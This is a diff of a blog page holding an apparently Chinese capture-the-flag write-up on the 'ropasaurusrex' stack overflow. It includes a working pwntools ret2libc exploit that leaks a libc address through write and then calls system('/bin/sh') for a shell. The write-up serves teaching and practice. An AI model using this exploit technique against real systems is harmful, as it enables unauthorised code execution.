@@ -435,7 +435,7 @@
                 
                   <span class="post-meta-item-text">Symbols count in article: </span>
                 
-                <span title="Symbols count in article">1.2k</span>
+                <span title="Symbols count in article">1.3k</span>
               
 
               
@@ -471,7 +471,7 @@
       
         <p>分析：<br>buf大小只有0x88,但是却允许被读入0x100的字节大小，造成缓冲区溢出。程序是32位。<br>定义函数：ssize_t write (int fd, const void * buf, size_t count);<br>函数说明：write()会把参数buf 所指的内存写入count 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动.  </p>
 <p>攻击思路：<br>1.构造 payload leak 内存中的一个函数地址，比如 read ，write（返回地址是有漏洞的函数，以便第二次利用）<br>2.计算libc base，得到 system 地址<br>3.构造payload get shell</p>
-<p>info leak:<br>payload：<br><code>&#39;A&#39; * N + p32(write_plt) + p32(ret) + p32(1) + p32(address) + p32(4)</code><br>输入N个字符后发生溢出，write_plt的地址将会覆盖 read 函数的返回地址，随后程序将会跳转到write函数，我们在栈中构造了write函数的3个参数和返回地址，这段payload相当于让程序执行<br><code>write(1, address, 4)</code>;<br>这样就可以dump出内存中地址为address处的4字节数据。 (参考：<a href="http://blog.csdn.net/smalosnail/article/details/53386353" target="_blank" rel="external">初探ROP攻击 Memory Leak &amp; DynELF</a>)<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">from</span> pwn import *</div><div class="line">elf = ELF(<span class="string">'./ropasaurusrex'</span>)</div><div class="line">io = <span class="built_in">process</span>(<span class="string">'./ropasaurusrex'</span>)</div><div class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>) <span class="comment">#原本写的 ./libc.so.6 出错了</span></div><div class="line">buf_len = <span class="number">0x88</span>  </div><div class="line">vun_fun = <span class="number">0x80483F4</span>   <span class="comment">#存在漏洞函数的地址</span></div><div class="line">read_offset = libc.symbols[<span class="string">'read'</span>]</div><div class="line"><span class="comment">#leak info </span></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">140</span>+p32(elf.symbols[<span class="string">'write'</span>])+p32(vun_fun)+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'read'</span>])+p32(<span class="number">4</span>)</div><div class="line">io.<span class="built_in">send</span>(payload)</div><div class="line">msg = io.recv(<span class="number">4</span>)</div><div class="line">read_addr = u32(msg)</div><div class="line"></div><div class="line"><span class="comment">#get shell</span></div><div class="line">libc_base = read_addr-read_offset</div><div class="line">sys_addr = libc_base+libc.symbols[<span class="string">'system'</span>]</div><div class="line">bin_addr = libc_base+next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">140</span>+p32(sys_addr)+p32(<span class="number">0xdeafbeef</span>)+p32(bin_addr)</div><div class="line"></div><div class="line">io.<span class="built_in">send</span>(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
+<p>info leak:<br>payload：<br><code>&#39;A&#39; * N + p32(write_plt) + p32(ret) + p32(1) + p32(address) + p32(4)</code><br>输入N个字符后发生溢出，write_plt的地址将会覆盖 read 函数的返回地址，随后程序将会跳转到write函数，我们在栈中构造了write函数的3个参数和返回地址，这段payload相当于让程序执行<br><code>write(1, address, 4)</code>;<br>这样就可以dump出内存中地址为address处的4字节数据。 (参考：<a href="http://blog.csdn.net/smalosnail/article/details/53386353" target="_blank" rel="external">初探ROP攻击 Memory Leak &amp; DynELF</a>)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">elf = ELF(&apos;./ropasaurusrex&apos;)</div><div class="line">io = process(&apos;./ropasaurusrex&apos;)</div><div class="line">libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;) #原本写的 ./libc.so.6 出错了</div><div class="line">buf_len = 0x88  </div><div class="line">vun_fun = 0x80483F4   #存在漏洞函数的地址</div><div class="line">read_offset = libc.symbols[&apos;read&apos;]</div><div class="line">#leak info </div><div class="line">payload = &apos;a&apos;*140+p32(elf.symbols[&apos;write&apos;])+p32(vun_fun)+p32(1)+p32(elf.got[&apos;read&apos;])+p32(4)</div><div class="line">io.send(payload)</div><div class="line">msg = io.recv(4)</div><div class="line">read_addr = u32(msg)</div><div class="line"></div><div class="line">#get shell</div><div class="line">libc_base = read_addr-read_offset</div><div class="line">sys_addr = libc_base+libc.symbols[&apos;system&apos;]</div><div class="line">bin_addr = libc_base+next(libc.search(&apos;/bin/sh&apos;))</div><div class="line">payload = &apos;a&apos;*140+p32(sys_addr)+p32(0xdeafbeef)+p32(bin_addr)</div><div class="line"></div><div class="line">io.send(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -592,7 +592,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">63</span>
+                    <span class="site-state-item-count">62</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -745,7 +745,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="Symbols count total">86k</span>
+    <span title="Symbols count total">88k</span>
   
 
   
@@ -754,7 +754,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="Reading time total">1:18</span>
+    <span title="Reading time total">1:20</span>
   
 </div>
 
